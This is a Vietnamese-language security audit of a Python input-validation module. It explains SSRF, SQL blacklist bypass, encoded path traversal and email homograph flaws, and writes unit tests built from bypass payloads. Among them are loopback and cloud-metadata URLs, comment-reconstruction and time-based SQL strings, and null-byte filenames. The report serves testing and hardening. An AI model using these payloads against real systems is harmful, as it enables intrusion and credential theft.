# Báo cáo lỗ hổng – `securevalidator/core.py`

Mỗi mục gồm: lỗ hổng là gì, mức độ nghiêm trọng, và cách sửa string trong `tests/test_validators.py` để vượt qua lỗ hổng đó.

Ghi chú: test tấn công dùng `assertTrue`/`assertIn` để khẳng định payload **lọt qua**. Vì vậy test PASS nghĩa là tấn công thành công.

---



## 1. SSRF trong `validate_url`

**Lỗ hổng là gì:** Hàm chỉ kiểm tra scheme là `http`/`https` và có hostname, nhưng không kiểm tra địa chỉ đích. Kẻ tấn công có thể đưa vào URL trỏ tới chính máy chủ hoặc mạng nội bộ, khiến server gửi request thay cho họ (Server-Side Request Forgery, CWE-918).

**Mức độ: CAO.** Nếu ứng dụng chạy trên cloud, URL `169.254.169.254` cho phép đọc metadata và có thể lấy được credential của server. Docstring ghi "prevent basic SSRF vectors" nhưng hàm không chặn được vector cơ bản nào.

**Cách sửa test để vượt qua:** Test gốc chỉ thử scheme sai (`ftp://`). Mình thay bằng URL nội bộ và đổi `assertFalse` thành `assertTrue`:

```python
# Trước (sách)
def test_validate_url_invalid(self):
    self.assertFalse(validate_url("ftp://example.com"))

# Sau (tấn công)
def test_bypass_url_ssrf_loopback(self):
    self.assertTrue(validate_url("http://127.0.0.1/admin"))
    self.assertTrue(validate_url("http://localhost/"))
    self.assertTrue(validate_url("http://[::1]/"))

def test_bypass_url_ssrf_cloud_metadata(self):
    self.assertTrue(validate_url("http://169.254.169.254/latest/meta-data/"))

def test_bypass_url_ssrf_ip_obfuscation(self):
    self.assertTrue(validate_url("http://2130706433/"))   # 127.0.0.1 dạng số nguyên
    self.assertTrue(validate_url("http://0x7f000001/"))   # 127.0.0.1 dạng hex
    self.assertTrue(validate_url("http://127.1/"))        # 127.0.0.1 dạng rút gọn
```

---

## 2. Vượt qua bộ lọc SQL trong `sanitize_sql_input`

**Lỗ hổng là gì:** Hàm dùng danh sách đen (blacklist): xoá một số ký tự (`-- ; ' " #`) và một số từ khoá (`OR AND SELECT…`) đúng một lượt. Mọi thứ không có trong danh sách, hoặc được ghép lại sau khi xoá, đều lọt qua (SQL Injection, CWE-89).

**Mức độ: CAO.** Nếu kết quả hàm này được ghép vào câu truy vấn, kẻ tấn công vẫn có thể chèn điều kiện, comment hoặc truy vấn làm chậm (time-based) để dò dữ liệu. Hàm còn làm hỏng dữ liệu hợp lệ như tên `O'Brien`.

**Cách sửa test để vượt qua:** Test gốc chỉ thử `' OR 1=1 --` (đúng những thứ có trong blacklist). Mình thay bằng payload né blacklist và kiểm tra rằng phần nguy hiểm vẫn còn sau khi lọc:

```python
# Trước (sách)
input_str = "' OR 1=1 --"
self.assertNotIn("--", sanitized)

# Sau (tấn công)
def test_bypass_sql_comment_reconstruction(self):
    # Xoá dấu ' giữa hai dấu - thì chúng ghép lại thành --
    self.assertIn("--", sanitize_sql_input("-'-"))
    self.assertIn("--", sanitize_sql_input("admin'-'-"))

def test_bypass_sql_inline_comment(self):
    # /**/ không có trong blacklist
    self.assertIn("/**/", sanitize_sql_input("SEL/**/ECT * FROM users"))

def test_bypass_sql_non_blacklisted_keywords(self):
    # ||, XOR, SLEEP, LIKE không có trong blacklist nên giữ nguyên
    self.assertEqual(sanitize_sql_input("1 || SLEEP(5)"), "1 || SLEEP(5)")
    self.assertEqual(sanitize_sql_input("1 XOR 1"), "1 XOR 1")
    self.assertEqual(sanitize_sql_input("1) LIKE (1"), "1) LIKE (1")

def test_bypass_sql_data_corruption(self):
    # Dữ liệu hợp lệ bị phá hỏng
    self.assertEqual(sanitize_sql_input("O'Brien"), "OBrien")
    self.assertEqual(sanitize_sql_input("DROP your fear"), "your fear")
```

---

## 3. Path traversal biến thể trong `validate_filename`

**Lỗ hổng là gì:** Hàm chỉ chặn chuỗi thô `..`, `/`, `\`. Tên file đã URL-encode hoặc chứa ký tự null byte vẫn được coi là hợp lệ (Path Traversal, CWE-22).

**Mức độ: TRUNG BÌNH.** Chỉ nguy hiểm khi phía sau có bước giải mã URL (`%2e%2e%2f` thành `../`) hoặc thành phần cắt chuỗi tại null byte. Hàm `open()` của Python 3 tự báo lỗi khi gặp null byte nên khả năng khai thác trực tiếp thấp hơn SSRF và SQL.

**Cách sửa test để vượt qua:** Test gốc thử `../../etc/passwd` (bị chặn). Mình thay bằng dạng mã hoá và null byte, đổi sang `assertTrue`:

```python
# Trước (sách)
self.assertFalse(validate_filename("../../etc/passwd"))

# Sau (tấn công)
def test_bypass_filename_encoded_traversal(self):
    self.assertTrue(validate_filename("%2e%2e%2fpasswd"))

def test_bypass_filename_null_byte(self):
    self.assertTrue(validate_filename("report.pdf\x00.exe"))
```

---

## 4. Email chứa ký tự Unicode trong `validate_email`

**Lỗ hổng là gì:** Pattern dùng `\w`, mà trong Python `\w` khớp cả ký tự Unicode. Email dùng chữ trông giống chữ Latin (homograph) vẫn hợp lệ, có thể dùng để giả mạo.

**Mức độ: THẤP.** Không cho phép chạy lệnh hay đọc dữ liệu, chỉ tạo điều kiện giả mạo địa chỉ. Hàm vẫn chặn được tấn công chèn header bằng ký tự xuống dòng (`\r\n`).

**Cách sửa test để vượt qua:** Thay email ASCII bằng email chứa ký tự `ł` (U+0142):

```python
# Trước (sách)
self.assertTrue(validate_email("user@example.com"))

# Sau (tấn công)
def test_bypass_email_unicode_homograph(self):
    self.assertTrue(validate_email("user@examp\u0142e.com"))
```

---

## 5. `sanitize_html_input` – không có lỗ hổng

Hàm dùng `html.escape()`, escape đầy đủ `& < > " '`. Các payload XSS thử nghiệm (`<script>`, `<img onerror=…>`, `"><svg onload=…>`) đều bị vô hiệu hoá, nên không có string nào vượt qua được. Test `test_control_html_cannot_be_bypassed` giữ lại để chứng minh điều này.

---

## Tổng hợp

| Lỗ hổng | Hàm | Mức độ |
|---|---|---|
| SSRF | `validate_url` | Cao |
| Vượt qua bộ lọc SQL | `sanitize_sql_input` | Cao |
| Path traversal biến thể | `validate_filename` | Trung bình |
| Email Unicode (homograph) | `validate_email` | Thấp |
| Không có | `sanitize_html_input` | – |
